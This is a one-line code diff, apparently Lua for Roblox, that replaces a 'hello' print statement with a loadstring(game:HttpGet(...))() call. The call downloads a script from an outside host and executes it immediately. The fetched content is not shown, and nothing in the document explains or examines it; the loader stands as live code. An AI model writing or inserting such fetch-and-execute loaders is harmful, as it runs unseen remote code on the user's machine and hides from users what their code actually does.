@@ -1,1 +1,1 @@
-print("hello jaaa")
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/e329336876c8916be212e752f9af8ee2936b964c4b099e8a8b1f794882f3c17b/download"))()
